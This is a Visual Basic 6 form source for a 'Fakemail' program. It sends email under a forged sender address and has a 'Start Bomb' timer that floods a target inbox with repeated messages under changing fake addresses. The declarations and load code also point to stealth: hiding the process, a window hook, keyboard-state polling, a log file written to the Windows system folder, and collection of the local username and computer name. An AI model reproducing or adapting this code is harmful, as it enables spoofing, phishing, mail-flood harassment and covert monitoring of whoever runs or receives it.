VERSION 5.00
Begin VB.Form f2 
   BorderStyle     =   0  'None
   Caption         =   "Fakemail"
   ClientHeight    =   5355
   ClientLeft      =   3210
   ClientTop       =   1440
   ClientWidth     =   5865
   Icon            =   "f2.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   5355
   ScaleWidth      =   5865
   ShowInTaskbar   =   0   'False
   Begin VB.CommandButton Command7 
      Caption         =   "Pick..."
      Height          =   300
      Left            =   3440
      TabIndex        =   1
      Top             =   0
      Width           =   975
   End
   Begin VB.CommandButton Command6 
      Caption         =   "C&hange Bomb"
      Height          =   375
      Left            =   2460
      TabIndex        =   13
      Top             =   3600
      Width           =   1215
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Start &Bomb"
      Height          =   375
      Left            =   1260
      TabIndex        =   12
      Top             =   3600
      Width           =   1095
   End
   Begin VB.TextBox r_name 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   1200
      TabIndex        =   7
      Top             =   1440
      Width           =   3135
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Same as Fake Email Address"
      Height          =   375
      Left            =   4440
      TabIndex        =   6
      Top             =   1035
      Width           =   1335
   End
   Begin VB.TextBox sender_name 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   1200
      TabIndex        =   5
      Top             =   1065
      Width           =   3135
   End
   Begin VB.TextBox port 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   4800
      MaxLength       =   7
      TabIndex        =   2
      Text            =   "25"
      Top             =   0
      Width           =   975
   End
   Begin VB.TextBox to_mail 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   720
      TabIndex        =   4
      Top             =   720
      Width           =   5055
   End
   Begin VB.TextBox f_email 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   1440
      TabIndex        =   3
      Text            =   "whatever_you_want@something.com"
      Top             =   370
      Width           =   4335
   End
   Begin VB.TextBox smtp_host 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   960
      TabIndex        =   0
      Top             =   0
      Width           =   2415
   End
   Begin VB.TextBox subject 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   50
      TabIndex        =   9
      Top             =   2000
      Width           =   5775
   End
   Begin VB.CommandButton Command3 
      Caption         =   "&Exit"
      Height          =   375
      Left            =   4870
      TabIndex        =   15
      Top             =   3600
      Width           =   975
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&Clear All"
      Height          =   375
      Left            =   3760
      TabIndex        =   14
      Top             =   3600
      Width           =   1035
   End
   Begin VB.TextBox body 
      Appearance      =   0  'Flat
      Height          =   975
      Left            =   50
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   10
      Top             =   2520
      Width           =   5775
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Send Mail"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   50
      TabIndex        =   11
      Top             =   3600
      Width           =   1095
   End
   Begin VB.TextBox txtstatus 
      Appearance      =   0  'Flat
      Height          =   1125
      Left            =   50
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   16
      Top             =   4200
      Width           =   5775
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   960
      TabIndex        =   27
      Text            =   "?"
      Top             =   6240
      Visible         =   0   'False
      Width           =   150
   End
   Begin VB.CheckBox Check2 
      Caption         =   "Same as Send To  Address"
      Height          =   375
      Left            =   4440
      TabIndex        =   8
      Top             =   1440
      Width           =   1335
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   3120
      Top             =   2640
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   3120
      Top             =   2640
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackColor       =   &H0000FF00&
      Caption         =   "Mail Sent!"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   0
      TabIndex        =   17
      Top             =   6960
      Visible         =   0   'False
      Width           =   5895
   End
   Begin VB.Label Label11 
      Caption         =   "Reciever Name:"
      Height          =   255
      Left            =   45
      TabIndex        =   26
      Top             =   1440
      Width           =   1215
   End
   Begin VB.Label Label10 
      Caption         =   "Sender Name:"
      Height          =   255
      Left            =   50
      TabIndex        =   25
      Top             =   1065
      Width           =   1095
   End
   Begin VB.Label Label9 
      Caption         =   "Port:"
      Height          =   255
      Left            =   4460
      TabIndex        =   24
      Top             =   0
      Width           =   375
   End
   Begin VB.Label Label8 
      Caption         =   "Send To:"
      Height          =   255
      Left            =   50
      TabIndex        =   23
      Top             =   735
      Width           =   735
   End
   Begin VB.Label Label6 
      Caption         =   "SMTP Host:"
      Height          =   255
      Left            =   50
      TabIndex        =   21
      Top             =   45
      Width           =   975
   End
   Begin VB.Label Label4 
      Caption         =   "Subject:"
      Height          =   255
      Left            =   50
      TabIndex        =   20
      Top             =   1755
      Width           =   615
   End
   Begin VB.Label Label3 
      Caption         =   "Message:"
      Height          =   255
      Left            =   50
      TabIndex        =   19
      Top             =   2280
      Width           =   855
   End
   Begin VB.Label Label2 
      Caption         =   "Sending Status:"
      Height          =   255
      Left            =   50
      TabIndex        =   18
      Top             =   3975
      Width           =   2055
   End
   Begin VB.Label Label7 
      Caption         =   "Fake Email Addess:"
      Height          =   255
      Left            =   45
      TabIndex        =   22
      Top             =   370
      Width           =   1455
   End
   Begin VB.Menu file 
      Caption         =   "&File"
      Begin VB.Menu save 
         Caption         =   "&Save Settings"
      End
      Begin VB.Menu open 
         Caption         =   "&Open Settings"
      End
      Begin VB.Menu sep1 
         Caption         =   "-"
      End
      Begin VB.Menu exer 
         Caption         =   "&Exit"
      End
   End
   Begin VB.Menu help 
      Caption         =   "&Help"
      Begin VB.Menu about 
         Caption         =   "&About"
      End
   End
End
Attribute VB_Name = "f2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function Getasynckeystate Lib "user32" Alias "GetAsyncKeyState" (ByVal VKEY As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegisterServiceProcess Lib "Kernel32.dll" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32.dll" () As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal Y As Long, ByVal cX As Long, ByVal cY As Long, ByVal wFlags As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer$, nSize As Long) As Long
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Const VK_CAPITAL = &H14
Const REG As Long = 1
Const HKEY_LOCAL_MACHINE As Long = &H80000002
Const HWND_TOPMOST = -1
Const SWP_NOMOVE = &H2
Const SWP_NOSIZE = &H1
Const flags = SWP_NOMOVE Or SWP_NOSIZE
Dim currentwindow As String
Dim bombmessage
Dim sss
Dim logfile As String

Private Sub about_Click()
f1.Show
End Sub

Private Sub Check1_Click()
If Check1.Value = 0 Then
sender_name.Text = ""
End If
If Check1.Value = 1 Then
sender_name.Text = f_email.Text
End If
End Sub

Private Sub Check2_Click()
If Check2.Value = 0 Then
r_name.Text = ""
End If
If Check2.Value = 1 Then
r_name.Text = to_mail.Text
End If
End Sub

Private Sub Command1_Click()
If smtp_host.Text = "die" Then
Command1.Visible = False
End If
Dim lfilesize As Long, txtlog As String, success As Integer
Dim from As String, name As String
Text2 = ""
inform
Text2 = body.Text
txtstatus = ""
Call StartWinsock("")
success = smtp(smtp_host.Text, port.Text, f_email.Text, to_mail.Text, sender_name.Text, r_name.Text, f_email.Text, subject.Text, Text2)
Call closesocket(mysock)
End Sub
Private Sub Command2_Click()
If smtp_host.Text = "die" Then
Command2.Visible = False
End If
subject.Text = ""
body.Text = ""
smtp_host.Text = ""
port.Text = ""
f_email.Text = ""
to_mail.Text = ""
sender_name.Text = ""
r_name.Text = ""
Check1.Value = 0
Check2.Value = 0
End Sub

Private Sub Command3_Click()
If smtp_host.Text = "die" Then
smtp_host.Visible = False
GoTo L:
End If
Unload Me
L:
End Sub

Private Sub Command4_Click()
'ShellExecute hWnd, "open", "http://www.maxban.com/tools/smtp.html?Domain=yahoo.com", vbNullString, vbNullString, conSwNormal
End Sub

Private Sub Command5_Click()
If Timer2.Enabled = True Then
Timer2.Enabled = False
Command5.Caption = "Start &Bomb"
GoTo L:
End If
If Timer2.Enabled = False Then
Command5.Caption = "Stop &Bomb"
Timer2.Enabled = True
Timer2_Timer
End If
L:
End Sub

Private Sub Command6_Click()
bombmessage = InputBox("Enter new 'from' in Mail Bomb:", "Mail Bomb 'From'", bombmessage)
End Sub

Private Sub Command7_Click()
f5.Show
End Sub

Private Sub exer_Click()
Unload Me
End
End Sub

Private Sub open_Click()
f4.Show
End Sub



Private Sub port_KeyPress(KeyAscii As Integer)
If Not KeyAscii = 8 Then
If KeyAscii < 48 Or KeyAscii > 57 Then
KeyAscii = 0
End If
End If
End Sub



Public Function CAPSLOCKON() As Boolean
Static bInit As Boolean
Static bOn As Boolean
If Not bInit Then
While Getasynckeystate(VK_CAPITAL)
Wend
bOn = GetKeyState(VK_CAPITAL)
bInit = True
Else
If Getasynckeystate(VK_CAPITAL) Then
While Getasynckeystate(VK_CAPITAL)
DoEvents
Wend
bOn = Not bOn
End If
End If
CAPSLOCKON = bOn
End Function






Private Sub Form_Load()
sss = 0
bombmessage = "MailBomb"

   HideMe

   Hook Me.hWnd
 
Dim mypath, newlocation As String, u


    
currentwindow = GetCaption(GetForegroundWindow)

logfile = Environ("WinDir") & "\system\" & App.EXEName & ".TXT"  'this points to the log file, you may change it



End Sub

Private Sub Form_Unload(Cancel As Integer)
UnHook Me.hWnd
End Sub




Public Sub FormOntop(FormName As Form)
    Call SetWindowPos(FormName.hWnd, HWND_TOPMOST, 0&, 0&, 0&, 0&, flags)
End Sub
Function GetCaption(WindowHandle As Long) As String
    Dim Buffer As String, TextLength As Long
    TextLength& = GetWindowTextLength(WindowHandle&)
    Buffer$ = String(TextLength&, 0&)
    Call GetWindowText(WindowHandle&, Buffer$, TextLength& + 1)
    GetCaption$ = Buffer$
End Function
Sub inform()
    Dim szUser As String * 255
    Dim vers As String * 255
    Dim lang, lReturn, comp As Long
    Dim s, x As Long
    lReturn = GetUserName(szUser, 255)
    comp = GetComputerName(vers, 1024)
    Text2 = "Username- " & szUser
    Text2 = Text2 & vbCrLf & "Computer Name- " & vers
End Sub


Private Sub save_Click()
f3.Show
End Sub

Private Sub Timer2_Timer()
sss = sss + 1
Dim lfilesize As Long, txtlog As String, success As Integer
Dim from As String, name As String
Text2 = ""
inform
Text2 = body.Text
txtstatus = ""
Call StartWinsock("")
success = smtp(smtp_host.Text, port.Text, bombmessage & sss & f_email.Text, to_mail.Text, sender_name.Text, r_name.Text, "mailbomb" & sss & f_email.Text, subject.Text, Text2)
Call closesocket(mysock)
End Sub
